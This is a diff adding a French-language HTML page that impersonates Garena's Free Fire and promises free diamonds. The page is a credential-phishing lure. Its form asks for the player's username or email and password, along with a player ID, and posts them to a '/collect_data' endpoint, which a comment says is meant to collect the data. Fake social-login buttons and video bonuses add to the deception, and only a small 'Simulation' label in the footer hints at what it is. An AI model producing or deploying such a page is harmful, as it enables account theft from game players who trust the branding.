@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Fire - Obtenez vos Diamants Gratuits !</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/e/ea/Free_Fire_logo.svg" type="image/svg+xml">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Oswald:wght@400;700&display=swap'); /* Police stylisée */
+
+        body {
+            font-family: 'Oswald', sans-serif;
+            background: #1a1a1a url('https://i.imgur.com/your_free_fire_background.jpg') no-repeat center center fixed; /* Remplacez par une URL d'image de fond Free Fire */
+            background-size: cover;
+            color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: rgba(0, 0, 0, 0.85);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.7); /* Ombre rouge pour le thème Free Fire */
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            border: 2px solid #ff0000;
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 25px;
+        }
+        h1 {
+            color: #ffcc00; /* Jaune doré pour le titre */
+            margin-bottom: 20px;
+            font-size: 2.2em;
+            text-shadow: 2px 2px 5px rgba(255, 0, 0, 0.7);
+        }
+        p {
+            margin-bottom: 25px;
+            line-height: 1.6;
+            font-size: 1.1em;
+        }
+        .form-section label {
+            display: block;
+            text-align: left;
+            margin-bottom: 8px;
+            color: #f0f0f0;
+            font-weight: bold;
+        }
+        .form-section input[type="text"],
+        .form-section input[type="email"],
+        .form-section input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #ff0000;
+            border-radius: 8px;
+            background-color: #333;
+            color: #f0f0f0;
+            font-size: 1em;
+            box-shadow: inset 0 0 5px rgba(255, 0, 0, 0.5);
+        }
+        .form-section input[type="text"]:focus,
+        .form-section input[type="email"]:focus,
+        .form-section input[type="password"]:focus {
+            border-color: #ffcc00;
+            outline: none;
+            box-shadow: 0 0 10px rgba(255, 204, 0, 0.7);
+        }
+        .login-methods {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        .login-methods button {
+            background-color: #555;
+            color: #f0f0f0;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: bold;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border: 1px solid #777;
+        }
+        .login-methods button:hover {
+            background-color: #ff0000;
+            transform: translateY(-3px);
+            box-shadow: 0 6px 15px rgba(255, 0, 0, 0.6);
+            border-color: #ffcc00;
+        }
+        .login-methods button img {
+            width: 24px;
+            height: 24px;
+        }
+        .submit-btn {
+            background-color: #ff0000;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1.2em;
+            font-weight: bold;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            width: 100%;
+            margin-top: 20px;
+            box-shadow: 0 6px 15px rgba(255, 0, 0, 0.5);
+        }
+        .submit-btn:hover {
+            background-color: #cc0000;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 0, 0, 0.7);
+        }
+        .video-section {
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 1px solid #555;
+        }
+        .video-section h2 {
+            color: #ffcc00;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+            text-shadow: 1px 1px 3px rgba(255, 0, 0, 0.5);
+        }
+        .video-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+        }
+        .video-item {
+            background-color: #2a2a2a;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            border: 1px solid #ff0000;
+        }
+        .video-item iframe {
+            width: 100%;
+            height: 120px; /* Taille réduite pour l'aperçu */
+            border: none;
+        }
+        .video-item p {
+            padding: 10px;
+            margin: 0;
+            font-size: 0.9em;
+            color: #ccc;
+        }
+        .footer {
+            margin-top: 30px;
+            font-size: 0.8em;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ea/Free_Fire_logo.svg" alt="Free Fire Logo" class="logo">
+        <h1>Obtenez des Diamants Gratuits pour Free Fire !</h1>
+        <p>Maître Aizen, remplissez les formalités ci-dessous pour lier votre compte et réclamer des milliers de diamants et des récompenses exclusives. Regardez nos vidéos partenaires pour débloquer encore plus de bonus !</p>
+
+        <form action="/collect_data" method="POST"> <!-- L'action du formulaire serait un script côté serveur pour collecter les données -->
+            <div class="form-section">
+                <h2>Choisissez votre méthode de connexion :</h2>
+                <div class="login-methods">
+                    <button type="button"><img src="https://i.imgur.com/google_icon.png" alt="Google"> Google</button> <!-- Remplacez les icônes par des URLs réelles -->
+                    <button type="button"><img src="https://i.imgur.com/facebook_icon.png" alt="Facebook"> Facebook</button>
+                    <button type="button"><img src="https://i.imgur.com/vk_icon.png" alt="VK"> VK</button>
+                    <button type="button"><img src="https://i.imgur.com/twitter_icon.png" alt="Twitter"> Twitter</button>
+                    <button type="button"><img src="https://i.imgur.com/apple_icon.png" alt="Apple ID"> Apple ID</button>
+                    <button type="button">Compte Invité</button>
+                    <button type="button">Autre</button>
+                </div>
+
+                <label for="username">Nom d'utilisateur ou Email/Téléphone :</label>
+                <input type="text" id="username" name="username" placeholder="Entrez votre nom d'utilisateur ou email" required>      
+
+                <label for="password">Mot de passe :</label>
+                <input type="password" id="password" name="password" placeholder="Entrez votre mot de passe" required>
+
+                <label for="playerid">ID Joueur Free Fire (Optionnel) :</label>
+                <input type="text" id="playerid" name="playerid" placeholder="Votre ID Free Fire pour un envoi direct">
+            </div>
+
+            <div class="video-section">
+                <h2>Regardez des Vidéos pour Doubler vos Diamants !</h2>
+                <p>Chaque vidéo regardée augmente vos chances de bonus rares et double les diamants de votre offre !</p>
+                <div class="video-grid">
+                    <div class="video-item">
+                        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?controls=0&modestbranding=1" title="YouTube video player 1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+                        <p>Astuces Pro pour Free Fire</p>
+                    </div>
+                    <div class="video-item">
+                        <iframe src="https://www.youtube.com/embed/another_video_id?controls=0&modestbranding=1" title="YouTube video player 2" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+                        <p>Nouveaux Skins Incroyables</p>
+                    </div>
+                    <div class="video-item">
+                        <iframe src="https://www.youtube.com/embed/yet_another_video_id?controls=0&modestbranding=1" title="YouTube video player 3" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+                        <p>Gagnez facilement des BOOYAH!</p>
+                    </div>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn">Obtenir Mes Diamants Maintenant !</button>
+        </form>
+
+        <div class="footer">
+            <p>&copy; 2025 Garena Free Fire (Simulation). Tous droits réservés.</p>
+            <p>Ce service est une offre promotionnelle limitée.</p>
+        </div>
+    </div>
+</body>
+</html>
